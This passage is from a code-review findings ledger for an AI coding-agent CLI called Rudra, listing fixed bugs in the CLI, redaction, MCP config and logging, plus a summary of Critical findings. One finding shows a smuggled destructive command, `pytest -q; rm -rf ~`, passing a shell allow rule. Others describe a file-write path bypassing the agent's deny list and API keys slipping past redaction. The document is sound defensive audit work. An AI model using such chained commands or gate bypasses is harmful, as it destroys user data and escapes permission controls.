not cleanly separable without changing a documented decision. Worth revisiting with a rule keyed on the info string. <br><br>**Closed 2026-08-21 as OPEN-3.** The rule keyed on the info string shipped; `test_keeps_inner_fences_when_stripping_outer` still passes unchanged. |
| CR-E12 | Minor | **`DONE`** | **A failed `git status` is indistinguishable from "nothing changed".** `git/core.py:194` `return _parse_status(result.stdout) if result.ok else []`. `changed_files_from_git` passes `is_repo` and gets `()` back, so `rudra verify` scans zero files and reports "passed — all 5 stages ran clean" over an unexamined tree — the exact outcome `verify/__init__.py:108-113` says it refuses for the not-a-repo case. In the loop the same `[]` makes `git_snapshot` return `{}` for both snapshots, so every attempt reads as "the coder wrote nothing". Reachable on a corrupt index, a `dubious ownership` refusal that still lets `rev-parse` through, or an ENOMEM. Fix: return `list \| None`, as `changed_files_from_git` and `git_snapshot` already do for "not a repo". <br><br>**FIXED 2026-08-21.** Fixed: `core.status` returns `None` when git fails, and all three callers treat that as "unknown" exactly as they already treat "not a repo". `tests/test_git_core.py` updated to assert the new contract with the reasoning. |

### CR-G — cli · repl · trace · mcp

| # | Severity | Status | Finding |
|---|---|---|---|
| CR-G1 | **Important** | **`DONE`** | **`--stream` is a dead flag: it never turns token streaming on.** The flag is declared at `cli.py:1230-1235` and its only use is `verbose=True if stream else verbose` at `:1278`. `get_config`/`build_config`/`cli_layer` accept only `verbose, permission_mode, allow_shell, allow_mcp` (`config/loader.py:452-459`, `config/layers.py:222-239`) — there is **no `stream_tokens` parameter anywhere**, and both consumers read config only (`subagents/runner.py:143`, `agent/planner_agent.py:484`). So `rudra --stream "…"` behaves exactly like `--verbose`. Contradicts three documents: `Documentation/02-configuration.md:301`, `Documentation/04-cli-reference.md:261`, and `CLAUDE.md` §6. No test covers the wiring. <br><br>**FIXED 2026-08-21.** Fixed: `stream_tokens` threaded through `cli_layer` → `build_config` → `get_config`, and `--stream` passes it. Verified: `--stream` now yields `agent.stream_tokens = True` with provenance `cli`; without the flag it stays `False`. |
| CR-G2 | **Important** | **`DONE`** | **`models test` and `doctor` ignore `--project-dir` when probing.** `cli.py:266` and `:837` build a Config for the named project, but the probe is `probe_role(roles[0])` and `probe_role` does `settings = get_config().model_for(role)` (`llm/probe.py:82`). `get_config()` with no argument builds from `Path.cwd()` (`loader.py:466-475`), and `build_config` never populates that cache; `main()` returns at `:1262` before it would seed it. **Measured twice:** with a project config declaring `model="vendor/model[preview]"` and cwd an empty dir, `rudra models test --project-dir $S/p1` printed the builtin default `ollama \| qwen3:32b`; run from the repo root it instead resolved *this repo's* `.env` and printed a green `openai_compatible / nvidia/nemotron-… / reach ok` — a passing table about a project it never read. Every column except "Roles" is cwd-derived. <br><br>**FIXED 2026-08-21.** Fixed: `probe_role(role, cfg)` takes the Config and passes it to `build_model`; both callers hand it the one they already loaded. Verified from `/tmp`: `models test -d <project>` now reports that project's model, not the CWD's. |
| CR-G3 | **Important** | **`DONE`** | **`rudra doctor` exits 0 with `fail` rows.** `doctor_command` (ends `cli.py:844`) prints the table and returns; it has **no exit-code path at all** — not for `memory … fail`, not for `.mcp.json … error`, not for `model (…) fail` at `:840`. `Documentation/04-cli-reference.md:424` states: "`rudra models test` and `rudra doctor` exit `1` when a check fails, which makes them usable in a setup script." **Measured:** with an unreachable ollama endpoint, `rudra doctor` printed `model (default, planner, coder, …) │ fail │ [Errno 61] Connection refused` and returned **exit 0**, so a setup script gating on it proceeds against a dead model. (`models test` does exit 1 at `:281-282` — only `doctor` is wrong.) <br><br>**FIXED 2026-08-21.** Fixed: `doctor` reads back its own Status column and exits 1 on `fail`/`error`. The MCP-command-not-on-PATH row now says `fail` rather than `missing`, so an uninitialised `.rudra` layout — the normal state doctor exists to diagnose — stays exit 0. Verified both ways: clean project 0, unresolvable MCP command 1. |
| CR-G4 | **Important** | **`DONE`** | **Unescaped user/model text reaches Rich on five print paths: swallowed content, and a crash that kills the REPL.** `cli.py:1333` (task prompt), `:1383` (single-shot success message), `:1485` (REPL failure message), `:269-278` (`models test` table cells), `:841` (doctor model row) all interpolate untrusted text with no `escape()` — while the neighbouring paths *do* escape the very same values (`:1396`, `:1446`). **Measured, both modes:** (a) `rudra "fix the [pending] task"` renders the panel as "fix the  task", and `model = "vendor/model[preview]"` prints as `vendor/model` — the defect `tests/test_cli_markup_escaping.py` already pins for `config list`, still open here; `probe.py:74-77` puts raw provider error text into `reach`/`construct`. (b) `rudra --auto "why does [/b] fail"` raised `rich.errors.MarkupError`, traceback, exit 1, **before the agent was built**; the same throw at `:1485` is inside `_repl_session`, whose `except` clauses catch only `CancelledError`/`KeyboardInterrupt`/`EOFError`, so it unwinds out of `asyncio.run` and kills the whole REPL session. <br><br>**FIXED 2026-08-21.** Fixed: all six sites `escape()`d — the task panel, both success messages, the REPL failure panel, the `models test` table cells and the doctor model row. Verified: `vendor/model[preview]` keeps its suffix in the real `models test` table, and bracketed prompt text no longer raises `MarkupError`. |
| CR-G5 | **Important** | **`DONE`** | **`--debug` leaks a log handler and duplicates every line, once per REPL turn.** `trace/debug.py:54-77` calls `logger.addHandler(handler)` with no check for an existing handler and no removal path. Its docstring says it "Returns the handler so a caller — and a test — can flush and detach it", but no caller does: `RudraAgent.close()` (`main_agent.py:178-185`) never touches it. The REPL builds a fresh agent per input (`cli.py:1456-1462`), so `create_main_agent` calls it again every turn. **Measured:** three calls → `len(logging.getLogger("rudra").handlers) == 3`, and one `logger.debug("hello")` wrote the line to `debug.jsonl` **three times**. At turn N the REPL holds N open descriptors on the file and writes every event N times — the file the docs tell users to attach to a bug report. `logger.setLevel(DEBUG)` and `propagate = False` are also set permanently and never restored. <br><br>**FIXED 2026-08-21.** Fixed: `configure_debug_logging` removes and closes any existing handler on the same resolved path before adding its own. Verified: three calls leave **1** handler and one `logger.debug` writes **1** line — was 3 and 3. |
| CR-G6 | **Important** | **`DONE`** | **`--stream`'s token deltas defeat redaction: the key body reaches console, transcript and `debug.jsonl`.** `permissions/approval.py:228` applies `redact(text)` to **each streamed delta independently**, but `redact`'s patterns need the whole credential in one string (`sk-[A-Za-z0-9_-]{8,}`, `NAME\s*[:=]\s*value`). **Measured against the real `redact`,** one key split across three deltas: `redact("OPENROUTER_API_KEY=sk")` → `OPENROUTER_API_KEY=<redacted>`, then `redact("-or-v1-dead")` → unchanged, `redact("beefcafebabe1234")` → unchanged. The rendered trace reads `OPENROUTER_API_KEY=<redacted>-or-v1-deadbeef…` — all but two characters of the key, in the console, in the always-on transcript, and in the debug log. `transcript.py:11-16` states writing by default is safe *only* because redaction happens where the event is built; that holds for `stream.py` but not for this second build site. Fix: buffer deltas per (namespace, role) and redact on a flushed boundary. <br><br>**FIXED 2026-08-21.** Fixed: deltas are buffered per role to a line boundary and redacted whole, with a whitespace-boundary flush for pathologically long lines and a final flush at stream end (`permissions/approval.py`). Verified: a key split across three deltas now renders `OPENROUTER_API_KEY=<redacted>` — previously all but two characters of the key reached the console, the transcript and `debug.jsonl`. |
| CR-G7 | **Important** | **`DONE`** | **`.mcp.json` ignores Claude Code's `type` key, so a pasted SSE server connects over HTTP.** `mcp/config.py:87` reads `body.get("transport")` only; Claude Code writes `"type"` — confirmed against a real `~/.claude.json`, whose server keys are `['type','command','args','env']`. The module docstring (`:1-6`) says the schema is Claude Code's "so a user pastes an existing config in unchanged (C4.2, D1)". Paste `{"linear": {"type": "sse", "url": "https://mcp.linear.app/sse"}}` and Rudra records `transport="http"`; `langchain_mcp_adapters` then routes it to `_create_streamable_http_session` against an SSE endpoint. `rudra mcp list` displays "http" and `rudra mcp test` fails with a transport error the user cannot explain from their own file. stdio and http coincide with Rudra's inference, so only `sse` breaks — silently. <br><br>**FIXED 2026-08-21.** Fixed: `body.get("type")` is read as a transport alias and both spellings are written back (`mcp/config.py`). Verified: a pasted Claude Code config with `"type": "sse"` now records `sse`, while stdio and explicit `transport` are unchanged. |
| CR-G8 | Minor | **`DONE`** | **`--debug` discards every traceback it exists to capture.** `trace/debug.py:44-51` builds the record from `record.getMessage()` and never reads `record.exc_info`. `memory/degrade.py:78` is the one Rudra call site logging a traceback (`exc_info=True`); in `debug.jsonl` it becomes `{"payload": "memory call search failed"}` with no exception, type or stack — so a user following `Documentation/06-troubleshooting.md` attaches the one line carrying none of the diagnosis. <br><br>**FIXED 2026-08-21.** Fixed: the JSONL formatter adds `traceback` when `record.exc_info` is set, so `memory/degrade.py`'s logged failures carry their stack into `debug.jsonl`. |
| CR-G9 | Minor | **`DONE`** | **Redaction misses any quoted secret containing a space.** `trace/redact.py:35-42` uses `(?P<value>[^\s'\"]+)`, excluding whitespace, with the closing `(?P=quote)` required immediately after. **Measured:** `redact('PASSWORD = "hunter two"')` returns the string unchanged. A passphrase or connection string in a `.env` the planner read reaches the console, transcript and debug log in full. `redact.py:20-23` is honest that this is pattern matching, but a *quoted* value is the one case the regex already knows it is looking at. <br><br>**FIXED 2026-08-21.** Fixed: `_ASSIGNMENT` grew a quoted branch allowing spaces. Verified: `PASSWORD = "hunter two"` and `DATABASE_PASSWORD = "p@ss w0rd; host=x"` are now redacted, while `TIMEOUT = 300` still passes through. |
| CR-G10 | Minor | **`DONE`** | **`mcp add` / `mcp remove` / `mcp test` traceback on a malformed `.mcp.json`.** `cli.py:1102`, `:1132`, `:1156` call `read_mcp_json` with no `except McpConfigError`, while `mcp_list` (`:1060-1066`) and `doctor` (`:654-660`) both catch it. With `.mcp.json` = `{"mcpServers": {"x": {}}}` (config.py:83-85 raises), `rudra mcp add y -- foo` dumps a Python traceback instead of the message the exception carries — and for `add` that means the user cannot repair the file through the CLI meant to manage it. <br><br>**FIXED 2026-08-21.** Fixed: `_read_mcp_or_exit` gives `mcp add`/`remove`/`test` the same `McpConfigError` handling `mcp_list` and `doctor` have. Verified: a malformed `.mcp.json` now prints the message naming the file and server, with no traceback. |
| CR-G11 | Minor | **`DONE`** | **The `@`-completer offers `project_tree`'s truncation footer as a filename.** `cli_repl.py:105` keeps every non-blank line of the listing, but `project_tree` appends a non-path line when it truncates (`filesystem/tree.py:108-109`: `f"… {omitted} more entries omitted (cap: {max_entries})"`). In any project over 300 listed files, typing `@m` offers "… 47 more entries omitted (cap: 300)" as a completion; accepting it inserts that sentence into the prompt and `expand_mentions` leaves it untouched, so it is sent to the model verbatim. <br><br>**FIXED 2026-08-21.** Fixed: `_project_files` drops the truncation footer (`cli_repl.py`). Verified on a 400-file project: 300 completions, none of them the `… N more entries omitted` line. |

---

## SECTION CR-SUMMARY

| Slice | Critical | Important | Minor | Total |
|---|---|---|---|---|
| CR-A memory · facts · context · skills | 0 | 2 | 4 | 6 |
| CR-B permissions · shell · tools | **2** | 2 | 5 | 9 |
| CR-C loop · agent · subagents | **1** | 4 | 4 | 9 |
| CR-D config · llm · state · compat · stacks | **1** | 5 | 3 | 9 |
| CR-E verify · testing · git · filesystem · middleware | **1** | 6 | 5 | 12 |
| CR-G cli · repl · trace · mcp | 0 | 7 | 4 | 11 |
| CR-F cross-cutting (main session) | 0 | 2 | 4 | 6 |
| CR-X cross-platform (owner requirement) | **1** (Windows) | 2 | 0 | 3 |
| CR-DOC `CLAUDE.md` accuracy | 0 | 6 | 4 | 10 |
| **Total** | **6** | **36** | **33** | **75** |

### Disposition, 2026-08-21

| | Count |
|---|---|
| **`DONE`** — fixed and verified | **73** |
| **`WONTFIX`** — CR-B3 (needs argv normalisation, a behaviour change), CR-X3 (owner declined CI) | **2** |
| **`PENDING`** | **0** |
| | **75** |

Updated 2026-08-21, in three passes. First the code review (62 findings).
Then the owner chose **option (a)** for CR-B4 and made Windows/macOS/Linux a
stated requirement, adding three CR-X portability findings. Then
`CONTRIBUTING.md` was re-read against `CLAUDE.md`, adding ten CR-DOC
accuracy findings — most of them instances of the one thing CONTRIBUTING
warns about: *"One fact, one owner — a second copy would drift."*

**Nothing is left `PENDING`.** The two `WONTFIX` rows each say what would
have to be decided to reopen them.

Two were **partial** when this tally was written, and both were finished
later the same day: **CR-E11**'s greedy-fence half became OPEN-3 and
**CR-C6**'s blocking-prompt half became OPEN-2. Their original rows below
are left as written, each now carrying a pointer to the OPEN item that
closed it.

**Gates after the work** (measured, not assumed):

```
uv run pytest -q                  → 1734 passed, 2 skipped   (was 1696; +38 regression tests)
.venv/bin/ruff check src/ tests/  → All checks passed!
.venv/bin/ruff format --check     → 258 files already formatted
.venv/bin/mypy src/rudra          → 19 errors (unchanged from the pre-work baseline)
.venv/bin/rudra --version         → Rudra v0.2.0
```

After OPEN-1, OPEN-3 and OPEN-2 closed later the same day:

```
uv run pytest -q                  → 1745 passed, 2 skipped
.venv/bin/ruff check src/ tests/  → All checks passed!
.venv/bin/ruff format --check     → 260 files already formatted
```

Every Critical was reproduced before it was fixed and re-verified after. The
17 new tests are regressions for the defects that had none — which was the
common thread: `tests/test_loop_run.py:85` already *assumed* CR-C1's correct
behaviour in a fake, `tests/test_permissions_approval.py:70` asserted CR-B1's
rule text but never what it matched, and CR-E1 sat behind a stage that
abstained rather than failed.

**The five Criticals, each reproduced end-to-end:**

1. **CR-E1** — the deterministic gate passes unparseable Python on any greenfield project, and the loop marks the task `DONE`.
2. **CR-B1** — `execute:pytest*`, the allow rule `CLAUDE.md` §6 advertises, permits `pytest -q; rm -rf ~` and reaches shell under `--auto` without `--allow-shell`.
3. **CR-B2** — `write_file(path=…)` bypasses the deny floor entirely, including `git-dir`, and the `ask`-mode approval panel shows no path.
4. **CR-D1** — the built-in Ollama `base_url` leaks onto every hosted provider, so the documented Anthropic config talks to `localhost:11434`.
5. **CR-C1** — `STOP_RUN` leaves the task `IN_PROGRESS`, so `--continue` can never retry it (A1.93 on the other exit path).

**Themes worth naming, because each recurs across slices rather than being one bug:**

- **Abstention reads as success.** CR-E1, CR-E5, CR-E6, CR-E9 and CR-E12 are all "a stage that did not run reports clean". A1.57 was fixed on the Python path only.
- **The gate decides on args nobody normalises.** CR-B2 (alias spellings), CR-B4 (virtual vs host absolute paths) and CR-B1/CR-B3 (`fnmatch` against a raw shell string) are one root cause: policy is matched against the model's spelling rather than the resolved call.
- **Rich markup escaping is done per-site, not structurally.** A1.67/A1.48/A1.91 fixed `trace/render.py`; CR-E4 and CR-G4 are the same defect on nine unescaped sites elsewhere, two of which crash rather than corrupt.
- **Defaults shaped for Ollama leak into every provider.** CR-D1 and CR-D2 share one cause: `DEFAULTS["model"]["default"]` holds provider-specific values that per-leaf merging cannot clear.
- **Config validation is strict where it was written and absent where it was not.** CR-D3, CR-D4 and CR-D5 all pass values no neighbouring section would accept, and CR-D4 fails *open* on the one flag that gates unattended shell.
